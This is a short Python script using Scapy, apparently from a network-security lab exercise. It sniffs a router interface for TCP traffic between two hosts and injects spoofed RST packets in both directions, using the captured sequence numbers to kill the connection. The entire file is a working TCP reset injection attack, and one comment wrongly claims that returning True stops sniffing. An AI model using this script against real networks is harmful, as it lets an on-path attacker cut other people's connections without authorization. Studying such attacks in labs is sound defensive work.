from scapy.all import *

CLIENT = "10.9.0.5"
SERVER = "192.168.60.5"
PORT = 1234

def attack(pkt):
    if pkt.haslayer(IP) and pkt.haslayer(TCP):
        ip = pkt[IP]
        tcp = pkt[TCP]

        # Match client -> server traffic
        if ip.src == CLIENT and ip.dst == SERVER and tcp.dport == PORT:

            print("\n[+] Packet captured!")
            print(f"{ip.src}:{tcp.sport} -> {ip.dst}:{tcp.dport}")
            print(f"Seq={tcp.seq}, Ack={tcp.ack}")

            print("[+] Sending RST packets...")

            # RST from server -> client (main)
            rst1 = IP(src=SERVER, dst=CLIENT) / \
                   TCP(sport=PORT,
                       dport=tcp.sport,
                       seq=tcp.ack,
                       flags="R")

            # RST from client -> server (backup)
            rst2 = IP(src=CLIENT, dst=SERVER) / \
                   TCP(sport=tcp.sport,
                       dport=PORT,
                       seq=tcp.seq,
                       flags="R")

            send(rst1, verbose=0)
            send(rst2, verbose=0)

            print("[+] RST sent. Connection should terminate.\n")

            return True  # stop sniffing

print("[*] Sniffing on router...")

sniff(
    iface="eth0",
    filter=f"tcp and port {PORT}",
    prn=attack,
    store=0
)